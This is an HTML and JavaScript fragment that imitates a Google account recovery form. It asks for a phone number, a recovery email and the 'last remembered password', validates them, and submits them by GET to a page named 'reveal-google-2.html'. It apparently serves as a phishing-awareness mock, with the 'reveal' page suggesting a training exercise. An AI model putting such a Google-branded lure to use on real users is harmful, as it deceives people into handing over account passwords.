<body>
 
   <!-- IMPORTANT: method=get and matching name attributes -->
    <form id="recoveryForm" action="reveal-google-2.html" method="get" novalidate>
      <label for="phone">Phone number</label>
      <input id="phone" name="phone" type="tel" placeholder="123-456-7890" maxlength="12" required />
      <div id="phoneError" class="error">Phone must be 10 digits in format 123-456-7890.</div>
      

      <p><label for="email">Recovery email</label>
      <input id="email" name="email" type="email" placeholder="name@example.com" required />
      <div id="emailError" class="error">Email must contain @ and end with .com.</div>

      <p><label for="password">Last remembered password</label>
      <input id="password" name="password" type="password" placeholder="Your last remembered password" required />
      <div id="passwordError" class="error">Last remembered password is required.</div>

      <p><button class='next'id="nextBtn" type="submit" disabled>Next</button>
    </form>
  </div>
</div><div class="footer"><div>English (United States)</div><div><a href="https://support.google.com/accounts?hl=en&visit_id=639002815694005484-1359071994&rd=2&p=account_iph#topic=3382296">Help</a><a href="https://policies.google.com/terms?gl=US&hl=en">Privacy</a><a href="https://policies.google.com/terms?gl=US&hl=en">Terms</a></div></div>


<script>
const phone = document.getElementById('phone');
const email = document.getElementById('email');
const password = document.getElementById('password');
const nextBtn = document.getElementById('nextBtn');
const phoneError = document.getElementById('phoneError');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');

function validateFields() {
  const phoneDigits = phone.value.replace(/\D/g, '');
  const phoneValid = phoneDigits.length === 10 && /^\d{3}-\d{3}-\d{4}$/.test(phone.value);
  const emailValid = email.value.includes('@') && email.value.endsWith('.com');
  const passwordValid = password.value.trim().length > 0;

  phoneError.style.display = phoneValid ? 'none' : 'block';
  emailError.style.display = emailValid ? 'none' : 'block';
  passwordError.style.display = passwordValid ? 'none' : 'block';

  nextBtn.disabled = !(phoneValid && emailValid && passwordValid);
}

// Auto-format phone number to xxx-xxx-xxxx
phone.addEventListener('input', () => {
  let digits = phone.value.replace(/\D/g, '');
  if (digits.length <= 3) {
    phone.value = digits;
  } else if (digits.length <= 6) {
    phone.value = digits.slice(0,3) + '-' + digits.slice(3);
  } else {
    phone.value = digits.slice(0,3) + '-' + digits.slice(3,6) + '-' + digits.slice(6,10);
  }
  validateFields();
});

email.addEventListener('input', validateFields);
password.addEventListener('input', validateFields);

// Block submission if invalid; otherwise allow navigation to reveal-google.html
const form = document.getElementById('recoveryForm');
form.addEventListener('submit', (e) => {
  validateFields();
  if (nextBtn.disabled) {
    e.preventDefault();
    alert('Please enter a valid phone number (10 digits), an email ending with .com, and your last remembered password.');
  }
});
</script>
